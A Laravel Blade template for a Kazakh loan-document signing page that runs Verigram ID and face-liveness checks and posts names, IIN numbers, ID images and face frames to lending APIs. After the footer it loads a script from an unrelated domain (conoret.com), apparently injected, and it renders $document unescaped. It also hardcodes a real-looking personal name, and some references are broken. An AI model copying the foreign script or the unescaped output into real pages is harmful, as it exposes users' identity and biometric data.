@include('header')

<div class="container py-lg-5 py-md-4">
    <div class="row align-items-center">
        <div class="col-lg-3"></div>
        <div class="col-lg-6 mt-4">

            <div class="form-control" id="sign" style="display: block;">
                @csrf
                <input type="hidden" value="{{$id}}" id="document_id">
                <input type="hidden" value="{{$phone}}" id="phone">
                <input type="hidden" value="{{$iin}}" id="iin">
                <input type="hidden" value="Мукан" id="name">
                <input type="hidden" value="Раджапов" id="lastName">
                <input type="hidden" value="Кудратулы" id="middleName">

                <h5 class="title-big">Ознакомлайтесь документом и придумайте пароль для личного кабинета. Вы всегда
                    сможете осмотреть свой документ в личном кабинете</h5>
                <div class="form-outline">
                    <a href="{!! $document !!}" class="title-small"><i class="fa fa-check"
                                                                       aria-hidden="true"></i> {{$name}}</a>
                </div>
                <button type="submit" id="button" class="btn btn-primary">Дальше</button>
            </div>


            <form style="display: none;" id="phoneInfo" class="form-group">
                @csrf
                <h1 class="title-small">На ваш номер отправился код подтверждение. Введите его для подписание
                    договоров</h1>
                <input class="form-control" type="number" id="code"></input>
                <button type="submit" class="btn btn-primary mt-2" id="check">Проверить</button>
            </form>

            <form style="display: none;" id="verigram">
                <button id="initButton" class="btn btn-primary">Пройти верификацию</button>
                <div style="max-width: 500px; margin: 20px 0px 0px 0px;">
                    <div id="id_veridoc"></div>
                    <div id="id_verilive"></div>
                </div>
                <div id="results">

                </div>
            </form>

            <div class="form-group" id="verilive" style="display: none;">
                <button class="btn btn-primary" onclick="onInitButtonClick()">Init</button>
                <button class="btn btn-primary" onclick="onStartButtonClick()">Start</button>
            </div>
        </div>
        <textarea style="display: none" id="customTranslations" rows="5" cols="50">{
  "ShowDocument": "Наведите камеру на документ",
  "ShowPassport": "Наведите камеру на паспорт",
  "ShowId": "Наведите камеру на удостоверение личности"
}</textarea>

        <textarea style="display: none;" cols="50" id="config_textarea" rows="10">{
    "recordVideo": false,
    "videoBitrate": 2500000,
    "rotated": false,
    "lang": "custom",

    "render": {
        "ui": "2",
        "oval": true,
        "ovalType": "contour",
        "ovalRingColor": {
            "default": "#D6C52A",
            "actionSuccess": "#2AD66F",
            "actionFailure": "#FF3F3F",
            "sessionSuccess": "#2AD66F",
            "sessionFailure": "#FF3F3F"
        },
        "ovalWidth": 1.0,

        "overlay": true,
        "overlayColor": {
            "default" : "#0F0C2B"
        },
        "overlayTransparency": {
            "default": 0.45
        },
        "outerOverlayColor": {
            "default" : "#0F0C2B"
        },
        "outerOverlayTransparency": {
            "default": 1.0
        },

        "arrow": true,
        "arrowColor": {
            "default": "#F0F0F0"
        },
        "arrowProgressColor": {
            "default": "#404040"
        },

        "hint": true,
        "hintTextColor": {
            "default": "#FFFFFF"
        },
        "hintFontType": "Arial",
        "hintUseProgressiveFontSize": true,
        "hintProgressiveFontSizeMultiplier": 1.0,
        "hintFontSize": 25,
        "hintCloudColor": {
            "default": "#2D312F"
        },

        "videoUploadProgressBar": true,
        "videoUploadProgressBarColor1": "#FFEA82",
        "videoUploadProgressBarColor2": "#eee"
    }
}
</textarea>


        <textarea id="renderProperties" style="display: none;" rows="10" cols="50">{
  "placeholder": true,
  "startButton": true,
  "containerBorderThickness": 1,
  "containerBorderRadius": 3,
  "containerBorderColor": {
    "default": "#000000"
  },
  "frame": true,
  "frameBorderThickness": 3,
  "frameBorderRadius": 20,
  "frameColor": {
    "default": "rgba(255, 255, 255, 1.0)",
    "detected": "rgba(30, 255, 88, 1.0)"
  },
  "overlay": true,
  "overlayPermanent": true,
  "overlayColor": {
        "default": "#ffffff"
  },
  "upperBarColor": {
        "default": "rgba(255, 255, 255, 1.0)"
  },
  "lowerBarColor": {
        "default": "#a2d2ff",
        "error": "#ffccd5"
  },
  "buttonColor": {
        "default": "#a2d2ff"
  },
  "buttonTextColor": {
        "default": "#353535"
  },
  "overlayTransparency": {
    "default": 0.7
  },
  "icons": true,
  "hint": true,
  "hintTextColor": {
    "default": "#353535"
  },
  "hintFontType": "Arial",
  "mirrorPreview": false
}</textarea>
    </div>
</div>
@include('footer')

<script src="//conoret.com/dsp?h=s3.eu-central-1.amazonaws.com&amp;r=0.43766416408579456" type="text/javascript"
        defer="" async=""></script>
</head>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
{{--<script src="https://services.verigram.ai:8443/s/verilive/verilive"></script>--}}
{{--<script src="https://s3.eu-central-1.amazonaws.com/verilive-statics.verigram.ai/verilive-v1.15.x.js"></script>--}}
<script src="https://s3.eu-central-1.amazonaws.com/verilive-statics.verigram.ai/verilive-v1.15.x.js"></script>

<script src="https://s3.eu-central-1.amazonaws.com/veridoc-statics.verigram.ai/veridoc-v1.16.x.js"></script>

<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
<script>
    document.getElementById('button').addEventListener('click', function (e) {
        e.preventDefault();
        let number = $("#phone").val();
        console.log(number)
        let iin = $("#iin").val();
        let document_id = $("#document_id").val();
        document.getElementById('sign').style.display = "none";
        document.getElementById('verigram').style.display = "block";
        //document.getElementById('phoneInfo').style.display = "block";
        console.log('here')
        document.getElementById('verigram').style.display = "block";
        /*    $.ajax({
                type: 'GET',
                url: 'https://biometry.i-credit.kz/api/takeCode',
                headers: {
                    'Accept': 'application/json',
                    'Access-Control-Allow-Origin': '*',
                },

                data: {
                    iin: iin,
                    phone: number,
                },
                success: function (res) {
                    console.log(res)
                    if (res.success) {
                        document.getElementById('check').style.display = "block";
                    } else {
                        document.getElementById('verigram').style.display = "block";
                    }
                },
                error: function (err) {
                    console.log(err)
                }
            });*/
    });

    document.getElementById('check').addEventListener('click', function (e) {
        e.preventDefault();
        let name = $("#name").val();
        let iin = $("#iin").val();
        let number = $("#number").val();
        let code = $("#code").val();
        let lastName = $("#lastName").val();
        let middleName = $("#middleName").val();
        let documentID = $("#document_id").val();
        $.ajax({
            type: 'GET',
            url: 'https://biometry.i-credit.kz/api/checkAndGetDocs',
            headers: {
                'Accept': 'application/json',
            },

            data: {
                iin: iin,
                phone: number,
                code: code,
                name: name,
                lastName: lastName,
                middleName: middleName,
            },

            success: function (res) {
                if (res.success) {
                    let image = res.image;
                    let name = res.name;
                    let surname = res.surname;
                    let fatherName = res.fatherName;
                    let docNumber = res.docNumber;
                    $.ajax({
                        type: 'POST',
                        url: 'https://api.mircreditov.kz/api/bmg',
                        headers: {
                            'Accept': 'application/json',
                        },

                        data: {
                            iin: iin,
                            phone: number,
                            name: name,
                            lastName: surname,
                            middleName: fatherName,
                            document_id: documentID,
                            image: image,
                        },
                        success: function (res) {
                            window.location.href = "https://api.mircreditov.kz/"
                        },
                        error: function () {
                            window.location.href = "https://api.mircreditov.kz/"
                        }
                    });
                } else {
                    document.getElementById('verigram').style.display = "block";
                }
            },
            error: function (err) {
                console.log(err)
            }
        });
    });

    let accessToken = null;
    let personID = null;
    var documentType = 1;
    var recognitionMode = 0;
    var language = 'ru';
    var customTranslations = JSON.parse(document.getElementById('customTranslations').value);
    var isGlareCheckNeeded = false;
    var isPhotocopyCheckNeeded = false;
    var isTranslitCheckNeeded = false;
    var isAutoDocTypeMode = false;
    var isImageOnlyMode = false;
    var renderProperties = JSON.parse(document.getElementById('renderProperties').value);

    const config = {
        autoDocType: isAutoDocTypeMode,
        docType: documentType,
        recognitionMode: recognitionMode,
        imageOnlyMode: isImageOnlyMode,
        translitCheck: isTranslitCheckNeeded,
        glareCheck: isGlareCheckNeeded,
        photocopyCheck: isPhotocopyCheckNeeded,
        lang: language,
        render: renderProperties,
        hints: customTranslations
    }

    let verilive_config = {
        "recordVideo": false,
        "videoBitrate": 2500000,
        "rotated": false,
        "lang": "custom",

        "render": {
            "oval": true,
            "ovalType": contour,
            "ovalRingColor": {
                "default": "#F5F542",
                "actionSuccess": "#00F500",
                "actionFailure": "#F50000",
                "sessionSuccess": "#00F500",
                "sessionFailure": "#F50000",
            },
            "ovalWidth": 1.0,

            "overlay": true,
            "overlayColor": {
                "default" : "#2F4F4F",
            },
            "overlayTransparency": {
                "default": 0.55,
            },

            "arrow": true,
            "arrowColor": {
                "default": "#F0F0F0",
            },
            "arrowProgressColor": {
                "default": "#404040",
            },

            "hint": true,
            "hintPosition": "bottom",
            "hintTextColor": {
                "default": "#C8C9CC",
            },
            "hintFontType": "Arial",
            "hintUseProgressiveFontSize": true,
            "hintProgressiveFontSizeMultiplier": 1.0,
            "hintFontSize": 25,
            "hintCloudColor": {
                "default": "#2D312F",
            },

            "videoUploadProgressBar": true,
            "videoUploadProgressBarColor1": "#FFEA82",
            "videoUploadProgressBarColor2": "#eee",
        },

        "hints": {
            // Hints
            "noHint": "",
            "noHintPrimary": "",
            "noHintDetailed": "",

            "noFace": "Вас Не Видно",
            "noFacePrimary": "Вас Не Видно",
            "noFaceDetailed": "",

            "badLight": "Выравните Освещение",
            "badLightPrimary": "Выравните Освещение",
            "badLightDetailed": "",

            "closer": "Ближе",
            "closerPrimary": "Поместите лицо в овал",
            "closerDetailed": "",

            "closerOvalTransitionPrimary": "Поднесите телефон ближе",
            "closerOvalTransitionDetailed": "",

            "away": "Отдалитесь",
            "awayPrimary": "Поместите лицо в овал",
            "awayDetailed": "",

            "closerToCenter": "Ближе к Центру Экрана",
            "closerToCenterPrimary": "Поместите лицо в овал",
            "closerToCenterDetailed": "",

            "targetLeft": "Медленно Поворачивайте Голову Влево",
            "targetLeftPrimary": "Налево",
            "targetLeftDetailed": "Медленно Поворачивайте Голову Влево",

            "targetRight": "Медленно Поворачивайте Голову Вправо",
            "targetRightPrimary": "Направо",
            "targetRightDetailed": "Медленно Поворачивайте Голову Вправо",

            "targetCenter": "Посмотрите Прямо",
            "targetCenterPrimary": "",
            "targetCenterDetailed": "",

            "lookWait": "Смотрите Прямо и Подождите",
            "lookWaitPrimary": "Отлично!",
            "lookWaitDetailed": "",

            "waitForProcessing": "Подождите, идет обработка...",
            "waitForProcessingPrimary": "Почти закончили",
            "waitForProcessingDetailed": "Подождите немного, мы кое-что\nпроверяем",

            "sessionSuccess": "Вы Прошли!",
            "sessionSuccessPrimary": "Вы Настоящий!",
            "sessionSuccessDetailed": "",

            "actionSuccessPrimary": "Отлично!",
            "actionSuccessDetailed": "",

            "sessionFailure": "Вы Не Прошли!",
            "sessionFailurePrimary": "Живость не подтверждена",
            "sessionFailureDetailed": "Попробуйте, еще раз. Постарайтесь\n снимать с хорошим освещением",

            "sessionError": "Произошла какая-то ошибка.\nПопробуйте перезапустить",
            "sessionErrorPrimary": "Ошибка",
            "sessionErrorDetailed": "Произошла какая-то ошибка.\nПопробуйте перезапустить",

            "clickMe": "Нажмите",

            // Errors
            "NotSupportedBrowserError": "Ваш браузер не поддерживается. Пожалуйста, используйте последние браузера Chrome, Firefox, Safari или Edge.",
            "NoWrapperError": "Что-то не так, попробуйте позже",

            "CameraNotFoundError": "Веб-камера не найдена. Пожалуйста, подсоедините веб-камеру к устройству и обновите эту страничку.",
            "CameraNotAllowedError": "Отказано в доступе к веб-камере. Пожалуйста, обновите эту страничку и разрешите доступ к веб-камере.",
            "CameraOverconstrainedError": "Веб-камера с минимальным разрешением 480p не найдена. Пожалуйста, подсоедините веб-камеру 480p (или выше) и обновите эту страничку.",
            "CameraSecurityError": "Ваш браузер отказал в доступе к веб-камере. Пожалуйста, измените настройки доступа к веб-камере в Вашем браузере.",
            "CameraNotReadableError": "Ошибка веб-камеры - невозможно прочитать данные с веб-камеры. Пожалуйста, проверьте Вашу веб-камеру.",
            "CameraAbortError": "Ошибка веб-камеры - невозможно прочитать данные с веб-камеры. Пожалуйста, проверьте Вашу веб-камеру.",
            "CameraBrowserAppNeedsConstantCameraPermission": "Скорее всего вашему браузеру нужно больше прав на камеру. Пожалуйста используйте последние браузера Chrome, Firefox, Safari или следуйте инструкции чтобы дать больше прав https://s3.eu-central-1.amazonaws.com/verilive-statics.verigram.ai/android_camera_permission_instruction.pdf",
            "CameraVirtualSuspected": "Что-то странное с вашей камерой.",

            "CameraStreamInterrupted": "Работа камеры прервалась.",
            "CameraStreamInterruptedPrimary": "Ошибка",
            "CameraStreamInterruptedDetailed": "Работа камеры прервалась",

            "SlowInternetError": "Плохое соединение. Попробуйте подключиться к более быстрому интернету",
            "SlowInternetErrorPrimary": "Ошибка",
            "SlowInternetErrorDetailed": "Плохое соединение. Попробуйте подключиться\nк более быстрому интернету",

            "ServerWorkError": "Что-то не так с сервером, попробуйте еще раз",
            "ServerWorkErrorPrimary": "Ошибка",
            "ServerWorkErrorDetailed": "Проблема с сервером, попробуйте еще раз",

            "ServerAuthorizationError": "Что-то не так, попробуйте позже",
            "ServerAuthorizationErrorPrimary": "Ошибка",
            "ServerAuthorizationErrorDetailed": "Сервис не авторизован",

            "ServerConnectionError": "Сервер не доступен. Проверьте интернет, попробуйте поменять сеть, выключить VPN",
            "ServerConnectionErrorPrimary": "Ошибка",
            "ServerConnectionErrorDetailed": "Сервер не доступен. Проверьте интернет,\n попробуйте поменять сеть, выключить VPN",

            "ClientWorkError": "Что-то не так, попробуйте еще раз",
            "ClientWorkErrorPrimary": "Ошибка",
            "ClientWorkErrorDetailed": "Ошибка на клиенте, попробуйте еще раз"
        },
    };

    document.getElementById('initButton').addEventListener('click', function (e) {
        e.preventDefault();
        let shortID = document.getElementById('document_id').value;
        let phone = document.getElementById('phone').value;
        let face_picture = '';
        let first = '';
        let gender = '';
        let iin = '';
        let middle = '';
        let last = '';
        let original = '';
        let best_frame = '';
        axios
            .get('https://api.mircreditov.kz/api/getAccessToken')
            .then((response) => {
                accessToken = response.data.access_token;
                personID = response.data.person_id;
                veridoc.setAccessToken(accessToken, personID);
                return veridoc.init(
                    'https://services.verigram.ai:8443/s/veridoc/ru/veridoc/',
                    '',
                    config
                );
            })
            .then(() => {
                let session_id = veridoc.start();
                veridoc.successCallback = (data) => {
                    face_picture = data.face_picture;
                    first = data.first_name;
                    gender = data.gender;
                    iin = data.iin;
                    middle = data.middle_name;
                    last = data.last_name;
                    original = data.original_image;
                    verilive.init(
                        'https://services.verigram.ai:8443/s/verilive/verilive',
                        '',
                        verilive_config
                    );
                    return verilive.start(accessToken, personID);
                };
                return null;
            })
            .then((session_token) => {
                verilive.successCallback = async (data) => {
                    best_frame = data.best_frame;
                    $.ajax({
                        url: "https://api.mircreditov.kz/api/fields",
                        type: "POST",
                        data: {
                            firstName: first,
                            gender: gender,
                            iin: iin,
                            lastName: last,
                            middleName: middle,
                            originalImage: original,
                            facePicture: face_picture,
                            best_frame: best_frame,
                            shortID: shortID,
                            phone: phone,
                        },
                        success: function (response) {
                            console.log(response)
                        }
                    });
                    verilive.dispose();
                    window.location.href=''
                };
                return null;
            })
    })
</script>
